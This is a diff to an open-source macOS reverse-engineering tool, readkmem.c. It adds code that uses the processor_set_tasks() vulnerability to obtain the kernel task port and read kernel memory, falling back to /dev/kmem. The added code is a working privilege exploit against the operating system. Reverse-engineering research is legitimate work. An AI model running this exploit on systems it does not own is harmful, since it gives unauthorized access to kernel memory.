@@ -13,12 +13,10 @@
  * Copyright (c) fG! - 2012,2013. All rights reserved.
  * reverser@put.as - http://reverse.put.as
  *
- * Note: This requires kmem/mem devices to be enabled
+ * Note: This requires kmem/mem devices to be enabled if processor_set_tasks() vuln not available
+ *
  * Edit /Library/Preferences/SystemConfiguration/com.apple.Boot.plist
  * add kmem=1 parameter, and reboot!
- *
- * To compile:
- * gcc -Wall -o readkmem readkmem.c
  *
  * v0.1 - Initial version
  * v0.2 - Some fixes
@@ -26,6 +24,8 @@
  * v0.4 - Code cleanups
  * v0.5 - Add feature to dump mach-o binaries from kernel space
  *        Code cleanups
+ * v0.6 - Try to use processor_set_tasks() vulnerability to read kernel memory
+ *        before trying to use /dev/kmem
  *
  * Redistribution and use in source and binary forms, with or without
  * modification, are permitted provided that the following conditions
@@ -65,8 +65,11 @@
 #include <mach-o/loader.h>
 #include <stddef.h>
 #include <assert.h>
+#include <mach/processor_set.h>
+#include <mach/mach_vm.h>
+#include <mach/mach.h>
 
-#define VERSION "0.5"
+#define VERSION "0.6"
 
 #define ERROR_MSG(fmt, ...) fprintf(stderr, "[ERROR] " fmt " \n", ## __VA_ARGS__)
 #define OUTPUT_MSG(fmt, ...) fprintf(stdout, fmt " \n", ## __VA_ARGS__)
@@ -79,14 +82,20 @@
 #define x86 0
 #define x64	1
 
+struct mem_source
+{
+    int fd;
+    mach_port_t kernel_port;
+} g_kmem_source;
+
 mach_vm_address_t vmaddr_slide = 0;
 
 void header(void);
 int8_t get_kernel_type (void);
-void readkmem(uint32_t fd, void *buffer, off_t off, size_t size);
+void readkmem(void *buffer, mach_vm_address_t target_addr, size_t size);
 void usage(void);
-static size_t get_image_size(uint32_t fd, off_t address);
-static void dump_binary(uint32_t fd, off_t address, void *buffer);
+static size_t get_image_size(mach_vm_address_t address);
+static void dump_binary(mach_vm_address_t address, void *buffer);
 
 /*
  * we need to find the binary file size
@@ -96,13 +105,13 @@ static void dump_binary(uint32_t fd, off_t address, void *buffer);
  * binary and get into problems :-)
  */
 static size_t
-get_image_size(uint32_t fd, off_t address)
+get_image_size(mach_vm_address_t address)
 {
     // allocate a buffer to read the header info
     // NOTE: this is not exactly correct since the 64bit version has an extra 4 bytes
     // but this will work for this purpose so no need for more complexity!
     struct mach_header header = {0};
-    readkmem(fd, &header, address, sizeof(struct mach_header));
+    readkmem(&header, address, sizeof(struct mach_header));
 
     uint16_t mach_header_size = sizeof(struct mach_header);
     switch (header.magic)
@@ -132,7 +141,7 @@ get_image_size(uint32_t fd, off_t address)
         exit(-1);
     }
     
-    readkmem(fd, loadcmds, address+mach_header_size, header.sizeofcmds);
+    readkmem(loadcmds, address+mach_header_size, header.sizeofcmds);
     
     // process and retrieve address and size of linkedit
     uint8_t *loadCmdAddress = 0;
@@ -184,13 +193,13 @@ end:
  * we dump each segment and advance the buffer
  */
 static void
-dump_binary(uint32_t fd, off_t address, void *buffer)
+dump_binary(mach_vm_address_t address, void *buffer)
 {
     // allocate a buffer to read the header info
     // NOTE: this is not exactly correct since the 64bit version has an extra 4 bytes
     // but this will work for this purpose so no need for more complexity!
     struct mach_header header = {0};
-    readkmem(fd, &header, address, sizeof(struct mach_header));
+    readkmem(&header, address, sizeof(struct mach_header));
     
     uint16_t mach_header_size = sizeof(struct mach_header);
     switch (header.magic)
@@ -219,7 +228,7 @@ dump_binary(uint32_t fd, off_t address, void *buffer)
         exit(-1);
     }
     // retrieve the load commands
-    readkmem(fd, loadcmds, address+mach_header_size, header.sizeofcmds);
+    readkmem(loadcmds, address+mach_header_size, header.sizeofcmds);
     
     // process and retrieve address and size of linkedit
     uint8_t *loadCmdAddress = 0;
@@ -244,7 +253,7 @@ dump_binary(uint32_t fd, off_t address, void *buffer)
                 // sync buffer position with file offset
                 buffer += segCmd->fileoff;
                 // we don't need to dump header plus load cmds because __TEXT segment address includes them!
-                readkmem(fd, buffer, segCmd->vmaddr+vmaddr_slide, segCmd->filesize);
+                readkmem(buffer, segCmd->vmaddr+vmaddr_slide, segCmd->filesize);
             }
             
         }
@@ -259,7 +268,7 @@ dump_binary(uint32_t fd, off_t address, void *buffer)
                 // sync buffer position with file offset
                 buffer += segCmd64->fileoff;
                 // we don't need to dump header plus load cmds because __TEXT segment address includes them!
-                readkmem(fd, buffer, segCmd64->vmaddr+vmaddr_slide, (size_t)segCmd64->filesize);
+                readkmem(buffer, segCmd64->vmaddr+vmaddr_slide, (size_t)segCmd64->filesize);
             }
         }
         // advance to next command
@@ -307,18 +316,33 @@ get_kernel_type (void)
 }
 
 void
-readkmem(uint32_t fd, void *buffer, off_t off, size_t size)
+readkmem(void *buffer, mach_vm_address_t target_addr, size_t size)
 {
-	if(lseek(fd, off, SEEK_SET) != off)
-	{
-		ERROR_MSG("Error in lseek. Are you root?");
-		exit(-1);
-	}
-    ssize_t bytes_read = read(fd, buffer, size);
-	if(bytes_read != size)
-	{
-        ERROR_MSG("Error while trying to read from kmem. Asked %ld bytes from offset %llx, returned %ld.", size, off, bytes_read);
-	}
+    if (g_kmem_source.kernel_port != 0)
+    {
+        mach_vm_size_t outsize = 0;
+        kern_return_t kr = mach_vm_read_overwrite(g_kmem_source.kernel_port, target_addr, size, (mach_vm_address_t)buffer, &outsize);
+        if (kr != KERN_SUCCESS)
+        {
+            ERROR_MSG("mach_vm_read_overwrite failed!");
+            exit(-1);
+        }
+    }
+    else if (g_kmem_source.fd != 0)
+    {
+        if(lseek(g_kmem_source.fd, target_addr, SEEK_SET) != (off_t)target_addr)
+        {
+            ERROR_MSG("Error in lseek. Are you root?");
+            exit(-1);
+        }
+        
+        ssize_t bytes_read = read(g_kmem_source.fd, buffer, size);
+        if(bytes_read != size)
+        {
+            ERROR_MSG("Error while trying to read from kmem. Asked %ld bytes from offset %llx, returned %ld.", size, target_addr, bytes_read);
+            exit(-1);
+        }
+    }
 }
 
 void
@@ -414,15 +438,43 @@ int main(int argc, char ** argv)
 		exit(-1);
 	}
 	
-    int32_t fd_kmem;
+    /* test if we can read kernel memory using processor_set_tasks() vulnerability */
+    /* vulnerability presented at BlackHat Asia 2014 by Ming-chieh Pan, Sung-ting Tsai. */
+    /* also described in Mac OS X and iOS Internals, page 387 */
+    host_t host_port = mach_host_self();
+    mach_port_t proc_set_default = 0;
+    mach_port_t proc_set_default_control = 0;
+    task_array_t all_tasks = NULL;
+    mach_msg_type_number_t all_tasks_cnt = 0;
+    kern_return_t kr = 0;
+    int valid_kernel_port = 0;
+
+    kr = processor_set_default(host_port, &proc_set_default);
+    if (kr == KERN_SUCCESS)
+    {
+        kr = host_processor_set_priv(host_port, proc_set_default, &proc_set_default_control);
+        if (kr == KERN_SUCCESS)
+        {
+            kr = processor_set_tasks(proc_set_default_control, &all_tasks, &all_tasks_cnt);
+            if (kr == KERN_SUCCESS)
+            {
+                OUTPUT_MSG("Found valid kernel port using processor_set_tasks() vulnerability!");
+                g_kmem_source.kernel_port = all_tasks[0];
+                valid_kernel_port = 1;
+            }
+        }
+    }
+    /* kernel not vulnerable, try to use /dev/kmem */
+    if (valid_kernel_port == 0)
+    {
+        if((g_kmem_source.fd = open("/dev/kmem",O_RDWR)) == -1)
+        {
+            ERROR_MSG("Error while opening /dev/kmem. Is /dev/kmem enabled?");
+            ERROR_MSG("Add parameter kmem=1 to /Library/Preferences/SystemConfiguration/com.apple.Boot.plist.");
+            exit(-1);
+        }
+    }
     
-	if((fd_kmem = open("/dev/kmem",O_RDWR)) == -1)
-	{
-		ERROR_MSG("Error while opening /dev/kmem. Is /dev/kmem enabled?");
-		ERROR_MSG("Add parameter kmem=1 to /Library/Preferences/SystemConfiguration/com.apple.Boot.plist.");
-		exit(-1);
-	}
-	    
     uint8_t *read_buffer = NULL;
     
 	FILE *outputfile;	
@@ -439,11 +491,11 @@ int main(int argc, char ** argv)
     {
         // first we need to find the file size because memory alignment slack spaces
         size_t imagesize = 0;
-        imagesize = get_image_size(fd_kmem, address);
+        imagesize = get_image_size(address);
         DEBUG_MSG("Target image size is 0x%lx", imagesize);
         read_buffer = calloc(1, imagesize);
         // and finally read the sections and dump their contents to the buffer
-        dump_binary(fd_kmem, address, (void*)read_buffer);
+        dump_binary(address, (void*)read_buffer);
         // dump buffer contents to file
         if (outputname != NULL)
         {
@@ -464,7 +516,7 @@ int main(int argc, char ** argv)
             exit(-1);
         }
         // read kernel memory
-        readkmem(fd_kmem, read_buffer, address, size);
+        readkmem(read_buffer, address, size);
         // dump to file
         if (outputname != NULL)
         {
